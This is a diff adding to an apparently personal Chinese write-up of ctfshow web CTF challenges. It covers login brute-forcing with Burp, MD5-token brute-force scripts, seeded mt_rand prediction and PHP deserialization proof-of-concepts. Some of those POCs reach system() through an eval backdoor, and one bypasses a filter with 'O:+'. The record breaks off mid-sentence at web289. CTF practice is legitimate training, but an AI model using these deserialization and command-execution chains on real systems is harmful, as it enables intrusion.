@@ -227,6 +227,181 @@ Flappy_js.js
 
 ![image-20241113134305246](assets/image-20241113134305246.png)
 
+### 爆破：
+
+#### web21
+
+![image-20241123165104490](assets/image-20241123165104490.png)
+
+抓个包
+
+![image-20241123165621808](assets/image-20241123165621808.png)
+
+我们可以看到他的账号密码是通过base64编码加密后再发送的，问题不大
+
+payload设置如下
+
+![image-20241123165947562](assets/image-20241123165947562.png)
+
+![image-20241123170139759](assets/image-20241123170139759.png)
+
+我们还要设置一下payload处理
+
+![image-20241123170509504](assets/image-20241123170509504.png)
+
+开始爆破，根据长度或者状态码判断即可
+
+![image-20241123172859359](assets/image-20241123172859359.png)
+
+#### web22
+
+域名爆破
+
+通过爆破ctf.show的子域名可以爆破到flag.ctf.show
+
+访问即可得到flag(虽然已经挂了)
+
+#### web23
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-03 11:43:51
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-03 11:56:11
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+error_reporting(0);
+
+include('flag.php');
+if(isset($_GET['token'])){
+    $token = md5($_GET['token']);
+    if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)){
+        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
+            echo $flag;
+        }
+    }
+}else{
+    highlight_file(__FILE__);
+
+}
+?>
+```
+
+分析代码可知： 需要找到一个合适的 token 值，使得以下条件成立：
+
+1、md5(token) 的第 1 位（从 0 开始算）等于第 14 位
+
+2、md5(token) 的第 14 位等于第 17 位。
+
+3、md5(token) 的第 1 位的整数值、14 位的整数值、和 17 位的整数值的和除以第 1 位的整数值等于第 31 位的整数值。
+
+
+
+既然不知道怎么凑那我们可以尝试爆破
+
+通过bp爆破一下1-1000中是否有符合上述条件的字符串
+
+![image-20241123230839908](assets/image-20241123230839908.png)
+
+哎我草，怎么就爆破出来了，虽然不知道为什么纯数字还能爆出来
+
+其他解法，可以用大佬的脚本
+
+```python
+# coding: utf-8
+# alberthao
+import hashlib
+
+dic = '0123456789qazwsxedcrfvtgbyhnujmikolp'
+for a in dic:
+    for b in dic:
+        t = str(a) + str(b)
+        md5 = hashlib.md5(t.encode('utf-8')).hexdigest()
+        # print md5
+        # print md5[1:2]
+        # print md5[14:15]
+        # print md5[17:18]
+        if md5[1:2] == md5[14:15] and md5[14:15] == md5[17:18]:
+            if (ord(md5[1:2])) >= 48 and ord(md5[1:2]) <= 57 and (ord(md5[14:15])) >= 48 and ord(md5[14:15]) <= 57:
+                if (ord(md5[17:18])) >= 48 and ord(md5[17:18]) <= 57 and (ord(md5[31:32])) >= 48 and ord(
+                        md5[31:32]) <= 57:
+                    if (int(md5[1:2]) + int(md5[14:15]) + int(md5[17:18])) / int(md5[1:2]) == int(md5[31:32]):
+                        print(t)
+```
+
+or
+
+```python
+import hashlib
+for i in range(1,10000):
+
+md5 = hashlib.md5(str(i).encode('utf-8')).hexdigest()
+
+if md5[1] != md5[14] or md5[14]!= md5[17]:
+	continue
+
+if(ord(md5[1]))>=48 and ord(md5[1])<=57 and (ord(md5[31]))>=48 and ord(md5[31])<=57:
+
+	if((int(md5[1])+int(md5[14])+int(md5[17]))/int(md5[1])==int(md5[31])):
+
+		print(i)
+```
+
+#### web24
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-03 13:26:39
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-03 13:53:31
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+include("flag.php");
+if(isset($_GET['r'])){
+    $r = $_GET['r'];
+    mt_srand(372619038);
+    if(intval($r)===intval(mt_rand())){
+        echo $flag;
+    }
+}else{
+    highlight_file(__FILE__);
+    echo system('cat /proc/version');
+}
+
+?>
+```
+
+这道题考察的是一个php伪随机数的题目
+
+> mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机 数。 提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数 因此不需要播种，并且如果设置了 seed参数 生成的随机数就是伪随机数，意思就是每次生成的随机数 是一样的
+
+虽然说是随机数，但是同一个种子会生成同一串数字
+
+poc
+
+```php
+<?php 
+mt_srand(372619038);
+echo intval(mt_rand()); 
+?>
+```
+
+不知道跟版本有没有关系，我随便找的php在线运行，成功得到flag
+
 ### **命令执行**：
 
 #### web29
@@ -1238,6 +1413,44 @@ poc
 
 ### 反序列化
 
+#### PHP的魔法方法
+
+PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：
+
+```scss
+__construct()，类的构造函数
+
+__destruct()，类的析构函数
+
+__call()，在对象中调用一个不可访问方法时调用
+
+__callStatic()，用静态方式中调用一个不可访问方法时调用
+
+__get()，获得一个类的成员变量时调用
+
+__set()，设置一个类的成员变量时调用
+
+__isset()，当对不可访问属性调用isset()或empty()时调用
+
+__unset()，当对不可访问属性调用unset()时被调用。
+
+__sleep()，执行serialize()时，先会调用这个函数
+
+__wakeup()，执行unserialize()时，先会调用这个函数
+
+__toString()，类被当成字符串时的回应方法
+
+__invoke()，调用函数的方式调用一个对象时的回应方法
+
+__set_state()，调用var_export()导出类时，此静态方法会被调用。
+
+__clone()，当对象复制完成时调用
+
+__autoload()，尝试加载未定义的类
+
+__debugInfo()，打印所需调试信息
+```
+
 #### web254
 
 ```php
@@ -1326,7 +1539,7 @@ $user = unserialize($_COOKIE['user']);
 
 区别不大只需要通过反序列化的方式实例化ctfShowUser()即可
 
-```
+```php
 $user = new ctfShowUser();
 $user->isVip=true; //不能漏
 echo urlencode(serialize($user));
@@ -1336,7 +1549,333 @@ echo urlencode(serialize($user));
 
 #### web256
 
+```php
+<?php
 
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 19:29:02
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+include('flag.php');
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+
+    public function checkVip(){
+        return $this->isVip;
+    }
+    public function login($u,$p){
+        return $this->username===$u&&$this->password===$p;
+    }
+    public function vipOneKeyGetFlag(){
+        if($this->isVip){
+            global $flag;
+            if($this->username!==$this->password){
+                    echo "your flag is ".$flag;
+              }
+        }else{
+            echo "no vip, no flag";
+        }
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) && isset($password)){
+    $user = unserialize($_COOKIE['user']);    
+    if($user->login($username,$password)){
+        if($user->checkVip()){
+            $user->vipOneKeyGetFlag();
+        }
+    }else{
+        echo "no vip,no flag";
+    }
+}
+```
+
+相比上一道题多了个
+
+```
+$this->username!==$this->password
+```
+
+区别不大
+
+poc
+
+```php
+$user = new ctfShowUser();
+$user->isVip=true;
+$user->username="okok";
+echo urlencode(serialize($user));
+```
+
+传参拿到flag
+
+#### web257
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 20:33:07
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctfShowUser{
+    private $username='xxxxxx';
+    private $password='xxxxxx';
+    private $isVip=false;
+    private $class = 'info';
+
+    public function __construct(){
+        $this->class=new info();
+    }
+    public function login($u,$p){
+        return $this->username===$u&&$this->password===$p;
+    }
+    public function __destruct(){
+        $this->class->getInfo();
+    }
+
+}
+
+class info{
+    private $user='xxxxxx';
+    public function getInfo(){
+        return $this->user;
+    }
+}
+
+class backDoor{
+    private $code;
+    public function getInfo(){
+        eval($this->code);
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) && isset($password)){
+    $user = unserialize($_COOKIE['user']);
+    $user->login($username,$password);
+}
+```
+
+这道题存在一个后门方法
+
+我们想办法走到后面方法这一步，并通过eval执行命令即可得到flag
+
+poc
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 20:33:07
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+
+class ctfShowUser{
+    private $username='xxxxxx';
+    private $password='xxxxxx';
+    private $isVip=false;
+    private $class = 'backDoor';
+
+    public function __construct(){
+        $this->class=new backDoor();
+    }
+    public function login($u,$p){
+        return $this->username===$u&&$this->password===$p;
+    }
+    public function __destruct(){
+        $this->class->getInfo();
+    }
+
+}
+
+class info{
+    private $user='xxxxxx';
+    public function getInfo(){
+        return $this->user;
+    }
+}
+
+class backDoor{
+    private $code ='system("cat fl*");';
+    public function getInfo(){
+        eval($this->code);
+    }
+}
+
+
+$user = new ctfShowUser();
+echo urlencode(serialize($user));
+
+```
+
+#### web258
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-12-02 17:44:47
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-12-02 21:38:56
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+    public $class = 'info';
+
+    public function __construct(){
+        $this->class=new info();
+    }
+    public function login($u,$p){
+        return $this->username===$u&&$this->password===$p;
+    }
+    public function __destruct(){
+        $this->class->getInfo();
+    }
+
+}
+
+class info{
+    public $user='xxxxxx';
+    public function getInfo(){
+        return $this->user;
+    }
+}
+
+class backDoor{
+    public $code;
+    public function getInfo(){
+        eval($this->code);
+    }
+}
+
+$username=$_GET['username'];
+$password=$_GET['password'];
+
+if(isset($username) && isset($password)){
+    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
+        $user = unserialize($_COOKIE['user']);
+    }
+    $user->login($username,$password);
+}
+```
+
+这道题相对于上一道题需要正则表达式进行绕过
+
+poc
+
+```php
+<?php
+class ctfShowUser{
+    public $username='xxxxxx';
+    public $password='xxxxxx';
+    public $isVip=false;
+    public $class = 'info';
+ 
+    public function __construct(){
+        $this->class=new backDoor();
+    }
+    public function login($u,$p){
+        return $this->username===$u&&$this->password===$p;
+    }
+    public function __destruct(){
+        $this->class->getInfo();
+    }
+ 
+}
+ 
+class backDoor{
+    public $code='system("tac ./flag.php");';
+    public function getInfo(){
+        eval($this->code);
+    }
+}
+$a = serialize(new ctfShowUser());
+$a = str_replace('O:','O:+',$a);
+echo urlencode($a);
+```
+
+我们可以通过+绕过
+
+#### web289
+
+flag.php
+
+```php
+$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+array_pop($xff);
+$ip = array_pop($xff);
+
+
+if($ip!=='127.0.0.1'){
+	die('error');
+}else{
+	$token = $_POST['token'];
+	if($token=='ctfshow'){
+		file_put_contents('flag.txt',$flag);
+	}
+}
+```
+
+
+
+```php
+<?php
+
+highlight_file(__FILE__);
+
+
+$vip = unserialize($_GET['vip']);
+//vip can get flag one key
+$vip->getFlag();
+```
+
+根据题目提示存在flag.php页面且只允许
 
 ### **Java反序列化：**
 
